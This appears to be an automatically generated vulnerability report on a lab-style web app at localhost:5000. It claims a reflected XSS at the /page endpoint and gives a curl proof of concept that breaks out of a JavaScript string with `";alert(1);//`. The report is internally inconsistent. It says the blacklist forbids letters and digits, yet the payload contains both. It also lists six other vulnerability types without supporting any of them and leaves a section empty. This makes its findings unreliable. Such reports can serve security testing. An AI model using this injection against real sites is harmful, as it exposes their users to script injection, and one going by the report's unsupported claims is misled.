# Analysis Report

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `XSS`
- `IDOR`
- `SSRF`
- `SQLI`
- `LFI`
- `RCE`
- `AFO`

## PAR Policy Analysis

## 詳細解析

The `/page` endpoint reflects user-supplied `name` directly into a JavaScript `<script>` block without proper escaping. The blacklist only forbids letters, digits and `<`/`>`, but does not block `"`, allowing an attacker to break out of the string literal and inject arbitrary JavaScript code. This leads to a classic reflected XSS in the generated page.

## PoC（概念実証コード）

```text
Use the following POST request to trigger alert XSS:

curl -X POST http://localhost:5000/page \
     -d 'name=";alert(1);//'

This injects `";alert(1);//` into the JS string, resulting in:

<script>
  var name = "";alert(1);//";
  document.write('Hello ' + name);
</script>

which executes `alert(1)`.
```

## 解析ノート

- The blacklist blocks letters, digits and `<` `>` only
- Payload can include double quotes to break out of the JS string
- script_content template uses `"%s"` without escaping
- Context: reflected input inside `<script>` tag
- Confirmed XSS via JS injection


